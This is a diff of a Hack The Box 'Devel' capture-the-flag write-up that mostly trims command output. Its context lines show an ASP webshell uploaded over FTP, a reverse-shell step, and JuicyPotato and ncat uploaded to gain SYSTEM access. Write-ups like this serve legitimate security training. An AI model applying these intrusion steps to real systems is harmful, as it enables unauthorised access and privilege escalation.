@@ -192,11 +192,7 @@ Response.Write(thisDir)
 ┌[siunam♥earth]-(~/ctf/htb/Machines/Devel)-[2023.05.16|20:39:19(HKT)]
 └> nano webshell.asp 
 ftp> put webshell.asp 
-local: webshell.asp remote: webshell.asp
-229 Entering Extended Passive Mode (|||49195|)
-125 Data connection already open; Transfer starting.
-100% |**************************************************************|   511       10.59 MiB/s    --:-- ETA
-226 Transfer complete.
+[...]
 511 bytes sent in 00:00 (14.08 KiB/s)
 ```
 
@@ -219,16 +215,7 @@ Ethernet adapter Local Area Connection 3:
    Subnet Mask . . . . . . . . . . . : 255.255.255.0
    Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:6ca8%15
                                        10.10.10.2
-
-Tunnel adapter isatap.{C57F02F8-DF4F-40EE-BC21-A206B3F501E4}:
-
-   Media State . . . . . . . . . . . : Media disconnected
-   Connection-specific DNS Suffix  . : 
-
-Tunnel adapter Local Area Connection* 9:
-
-   Media State . . . . . . . . . . . : Media disconnected
-   Connection-specific DNS Suffix  . : 
+[...]
 ```
 
 **Let's get a reverse shell!**
@@ -272,16 +259,7 @@ Ethernet adapter Local Area Connection 3:
    Subnet Mask . . . . . . . . . . . : 255.255.255.0
    Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:6ca8%15
                                        10.10.10.2
-
-Tunnel adapter isatap.{C57F02F8-DF4F-40EE-BC21-A206B3F501E4}:
-
-   Media State . . . . . . . . . . . : Media disconnected
-   Connection-specific DNS Suffix  . : 
-
-Tunnel adapter Local Area Connection* 9:
-
-   Media State . . . . . . . . . . . : Media disconnected
-   Connection-specific DNS Suffix  . : 
+[...]
 PS C:\windows\system32\inetsrv> 
 ```
 
@@ -305,27 +283,7 @@ Administrator            babis                    Guest
 ```shell
 PS C:\windows\system32\inetsrv> net user babis
 User name                    babis
-Full Name                    
-Comment                      
-User's comment               
-Country code                 000 (System Default)
-Account active               Yes
-Account expires              Never
-
-Password last set            18/3/2017 2:15:19 ??
-Password expires             Never
-Password changeable          18/3/2017 2:15:19 ??
-Password required            No
-User may change password     Yes
-
-Workstations allowed         All
-Logon script                 
-User profile                 
-Home directory               
-Last logon                   18/3/2017 2:17:50 ??
-
-Logon hours allowed          All
-
+[...]
 Local Group Memberships      *Users                
 Global Group memberships     *None                 
 ```
@@ -401,7 +359,7 @@ System Type:               X86-based PC
 [...]
 ```
 
-As you can see, this Windows machine is Windows 7 Enterprise, version 6.1.7600 N/A Build 7600.
+As you can see, this Windows machine is 32-bit (x86) Windows 7 Enterprise, version 6.1.7600 N/A Build 7600.
 
 That being said, this Windows version is vulnerable to **[JuicyPotato](https://github.com/ohpe/juicy-potato)**, [RoguePotato](https://github.com/antonioCoco/RoguePotato), and other **Potatoes**.
 
@@ -414,17 +372,11 @@ ftp> binary
 200 Type set to I.
 ftp> put /opt/juicy-potato/Juicy.Potato.x86.exe JuicyPotatox86.exe
 local: /opt/juicy-potato/Juicy.Potato.x86.exe remote: JuicyPotatox86.exe
-229 Entering Extended Passive Mode (|||49222|)
-125 Data connection already open; Transfer starting.
-100% |**************************************************************|   257 KiB    1.64 MiB/s    00:00 ETA
-226 Transfer complete.
+[...]
 263680 bytes sent in 00:00 (486.86 KiB/s)
 ftp> put /opt/static-binaries/binaries/windows/x86/ncat.exe ncat.exe
 local: /opt/static-binaries/binaries/windows/x86/ncat.exe remote: ncat.exe
-229 Entering Extended Passive Mode (|||49218|)
-125 Data connection already open; Transfer starting.
-100% |**************************************************************|  2278 KiB    2.01 MiB/s    00:00 ETA
-226 Transfer complete.
+[...]
 2332672 bytes sent in 00:01 (1.94 MiB/s)
 ```
 
@@ -468,16 +420,7 @@ Ethernet adapter Local Area Connection 3:
    Subnet Mask . . . . . . . . . . . : 255.255.255.0
    Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:6ca8%15
                                        10.10.10.2
-
-Tunnel adapter isatap.{C57F02F8-DF4F-40EE-BC21-A206B3F501E4}:
-
-   Media State . . . . . . . . . . . : Media disconnected
-   Connection-specific DNS Suffix  . : 
-
-Tunnel adapter Local Area Connection* 9:
-
-   Media State . . . . . . . . . . . : Media disconnected
-   Connection-specific DNS Suffix  . : 
+[...]
 ```
 
 I'm `nt authority\system`!
